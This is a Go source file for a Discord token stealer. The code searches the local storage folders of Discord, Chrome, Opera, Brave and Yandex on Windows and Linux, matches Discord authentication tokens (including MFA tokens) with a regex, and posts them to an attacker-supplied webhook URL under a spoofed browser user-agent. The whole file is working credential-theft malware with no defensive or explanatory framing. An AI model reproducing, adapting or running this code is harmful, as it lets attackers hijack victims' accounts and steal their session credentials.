package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
)

const (
	WEBHOOK_URL = "your webhook"
	PING_ME     = false
)

var tokenRe = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")

func getDirs() (paths map[string]string) {
	if runtime.GOOS == "windows" {
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		paths = map[string]string{
			"Discord":        roaming + "/Discord",
			"Discord Canary": roaming + "/discordcanary",
			"Discord PTB":    roaming + "/discordptb",
			"Google Chrome":  local + "/Google/Chrome/User Data/Default",
			"Opera":          roaming + "/Opera Software/Opera Stable",
			"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
			"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
		}
	} else {
		homedir, _ := os.UserHomeDir()
		paths = map[string]string{
			"Discord":        homedir + "/.config/discord",
			"Discord Canary": homedir + "/.config/discordcanary",
			"Discord PTB":    homedir + "/.config/discordptb",
			"Google Chrome":  homedir + "/.config/google-chrome/Default",
			"Opera":          homedir + "/.config/opera",
			"Brave":          homedir + "/.config/BraveSoftware",
		}
	}
	return
}

func findTokens(path string) (tokens []string) {
	path += "/Local Storage/leveldb/"
	files, _ := ioutil.ReadDir(path)
	for _, file := range files {
		name := file.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
			content, _ := ioutil.ReadFile(path + "/" + name)
			lines := bytes.Split(content, []byte("\\n"))
			for _, line := range lines {
				for _, match := range tokenRe.FindAll(line, -1) {
					tokens = append(tokens, string(match))
				}
			}
		}
	}
	return
}

func main() {
	paths := getDirs()

	var message string
	if PING_ME {
		message = "@everyone\\n"
	}
	for platform, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		message += fmt.Sprintf("**%s**\\n```\\n", platform)
		tokens := strings.Join(findTokens(path), "\\n")
		if len(tokens) > 0 {
			message += tokens
		} else {
			message += "No tokens were found"
		}
		message += "\\n```\\n"
	}
	data := []byte(`{"content":"` + message + `"}`)
	req, _ := http.NewRequest("POST", WEBHOOK_URL, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0")
	req.Header.Set("content-type", "application/json")
	cl := &http.Client{}
	resp, err := cl.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}
